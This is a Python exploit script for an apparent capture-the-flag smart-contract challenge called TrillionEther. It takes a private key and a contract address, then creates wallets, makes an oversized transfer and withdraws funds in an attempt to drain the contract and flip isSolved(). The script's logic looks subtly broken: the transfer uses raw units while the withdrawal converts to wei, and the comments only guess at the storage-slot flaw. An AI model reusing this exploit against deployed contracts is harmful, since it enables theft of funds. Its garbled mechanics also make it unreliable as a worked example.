
import sys
from web3 import Web3
from eth_account import Account
from getpass import getpass
import json

def main():
    try:
        print("=== TrillionEther CTF Exploit Script ===\n")

        # Accept user inputs dynamically
        rpc_endpoint = input("Enter the RPC endpoint URL: ").strip()
        private_key = getpass("Enter your private key (input hidden): ").strip()
        your_address = input("Enter your Ethereum address: ").strip()
        challenge_contract_address = input("Enter the challenge contract address: ").strip()

        # Initialize Web3
        web3 = Web3(Web3.HTTPProvider(rpc_endpoint))
        if not web3.is_connected():
            print("Failed to connect to the RPC endpoint.")
            sys.exit(1)
        print("Connected to RPC endpoint.")

        # Set up account
        try:
            account = Account.from_key(private_key)
        except Exception as e:
            print(f"Invalid private key: {e}")
            sys.exit(1)

        if account.address.lower() != your_address.lower():
            print("The provided private key does not match the provided address.")
            sys.exit(1)
        print(f"Using account: {account.address}")

        # Define the contract ABI
        contract_abi = [
            {
                "inputs": [],
                "stateMutability": "payable",
                "type": "constructor"
            },
            {
                "inputs": [],
                "name": "isSolved",
                "outputs": [
                    {
                        "internalType": "bool",
                        "name": "",
                        "type": "bool"
                    }
                ],
                "stateMutability": "view",
                "type": "function"
            },
            {
                "inputs": [
                    {
                        "internalType": "bytes32",
                        "name": "name",
                        "type": "bytes32"
                    }
                ],
                "name": "createWallet",
                "outputs": [],
                "stateMutability": "payable",
                "type": "function"
            },
            {
                "inputs": [
                    {
                        "internalType": "uint256",
                        "name": "fromWalletId",
                        "type": "uint256"
                    },
                    {
                        "internalType": "uint256",
                        "name": "toWalletId",
                        "type": "uint256"
                    },
                    {
                        "internalType": "uint256",
                        "name": "amount",
                        "type": "uint256"
                    }
                ],
                "name": "transfer",
                "outputs": [],
                "stateMutability": "nonpayable",
                "type": "function"
            },
            {
                "inputs": [
                    {
                        "internalType": "uint256",
                        "name": "walletId",
                        "type": "uint256"
                    },
                    {
                        "internalType": "uint256",
                        "name": "amount",
                        "type": "uint256"
                    }
                ],
                "name": "withdraw",
                "outputs": [],
                "stateMutability": "nonpayable",
                "type": "function"
            },
            {
                "inputs": [
                    {
                        "internalType": "bytes32",
                        "name": "name",
                        "type": "bytes32"
                    },
                    {
                        "internalType": "uint256",
                        "name": "balance",
                        "type": "uint256"
                    },
                    {
                        "internalType": "address",
                        "name": "owner",
                        "type": "address"
                    }
                ],
                "name": "_newWallet",
                "outputs": [
                    {
                        "internalType": "struct TrillionEther.Wallet",
                        "name": "wallet",
                        "type": "tuple",
                        "components": [
                            {
                                "internalType": "bytes32",
                                "name": "name",
                                "type": "bytes32"
                            },
                            {
                                "internalType": "uint256",
                                "name": "balance",
                                "type": "uint256"
                            },
                            {
                                "internalType": "address",
                                "name": "owner",
                                "type": "address"
                            }
                        ]
                    }
                ],
                "stateMutability": "nonpayable",
                "type": "function"
            },
            {
                "inputs": [
                    {
                        "internalType": "uint256",
                        "name": "",
                        "type": "uint256"
                    }
                ],
                "name": "wallets",
                "outputs": [
                    {
                        "internalType": "bytes32",
                        "name": "name",
                        "type": "bytes32"
                    },
                    {
                        "internalType": "uint256",
                        "name": "balance",
                        "type": "uint256"
                    },
                    {
                        "internalType": "address",
                        "name": "owner",
                        "type": "address"
                    }
                ],
                "stateMutability": "view",
                "type": "function"
            }
        ]

        # Initialize contract instance
        try:
            contract = web3.eth.contract(address=web3.to_checksum_address(challenge_contract_address), abi=contract_abi)
        except Exception as e:
            print(f"Error initializing contract: {e}")
            sys.exit(1)
        print("Contract instance created.")

        # Helper function to build and send transactions
        def send_transaction(func, *args, value=0, gas=300000, gas_price_gwei=1):
            nonce = web3.eth.get_transaction_count(account.address)
            tx = func(*args).build_transaction({
                'from': account.address,
                'nonce': nonce,
                'gas': gas,
                'gasPrice': web3.to_wei(gas_price_gwei, 'gwei'),
                'value': web3.to_wei(value, 'ether')
            })
            signed_tx = web3.eth.account.sign_transaction(tx, private_key=private_key)
            # Update attribute name to 'raw_transaction' for latest web3.py versions
            tx_hash = web3.eth.send_raw_transaction(signed_tx.raw_transaction)
            print(f"Transaction sent: {tx_hash.hex()}")
            receipt = web3.eth.wait_for_transaction_receipt(tx_hash)
            print(f"Transaction mined in block {receipt.blockNumber}.")
            return receipt

        # Function to create a new wallet
        def create_wallet(name, value):
            print(f"\nCreating wallet '{name}' with {value} ether.")
            name_bytes = web3.to_bytes(text=name)
            if len(name_bytes) > 32:
                name_bytes = name_bytes[:32]
            elif len(name_bytes) < 32:
                name_bytes = name_bytes.ljust(32, b'\0')
            try:
                send_transaction(contract.functions.createWallet, name_bytes, value=value)
                print(f"Wallet '{name}' created successfully.")
            except Exception as e:
                print(f"Error creating wallet '{name}': {e}")
                sys.exit(1)

        # Function to withdraw funds from a wallet
        def withdraw_funds(wallet_id, amount):
            print(f"\nWithdrawing {amount} ether from wallet ID {wallet_id}.")
            try:
                send_transaction(contract.functions.withdraw, wallet_id, web3.to_wei(amount, 'ether'))
                print(f"Withdrawal from wallet ID {wallet_id} successful.")
            except Exception as e:
                print(f"Error withdrawing from wallet ID {wallet_id}: {e}")
                sys.exit(1)

        # Exploit Logic
        print("\n=== Starting Exploit ===")

        # Step 1: Create two wallets. Due to the vulnerability, they might share the same storage slot.
        create_wallet("wallet1", 0)
        create_wallet("wallet2", 0)

        # Step 2: Manipulate the balance by transferring funds between wallets
        # Since the wallets share the same storage slot, transferring from one affects the other.

        # For demonstration, we'll transfer a large amount from wallet0 to wallet1
        # Note: Adjust wallet IDs based on actual deployment
        wallet_id_from = 0
        wallet_id_to = 1
        transfer_amount = 1000000  # 1,000,000 ether

        print(f"\nTransferring {transfer_amount} ether from wallet ID {wallet_id_from} to wallet ID {wallet_id_to}.")
        try:
            send_transaction(contract.functions.transfer, wallet_id_from, wallet_id_to, transfer_amount)
            print("Transfer successful.")
        except Exception as e:
            print(f"Error during transfer: {e}")
            sys.exit(1)

        # Step 3: Withdraw funds from one of the wallets, potentially draining the contract
        withdraw_funds(wallet_id_from, transfer_amount)  # Attempt to withdraw the large amount

        # Step 4: Verify if the exploit was successful by checking isSolved
        print("\nChecking if the contract is solved...")
        try:
            is_solved = contract.functions.isSolved().call()
            if is_solved:
                print("Exploit successful! isSolved() is now True.")
            else:
                print("Exploit failed. isSolved() is still False.")
        except Exception as e:
            print(f"Error checking isSolved: {e}")
            sys.exit(1)

    except KeyboardInterrupt:
        print("\nScript terminated by user.")
        sys.exit(0)
    except Exception as e:
        print(f"An unexpected error occurred: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()

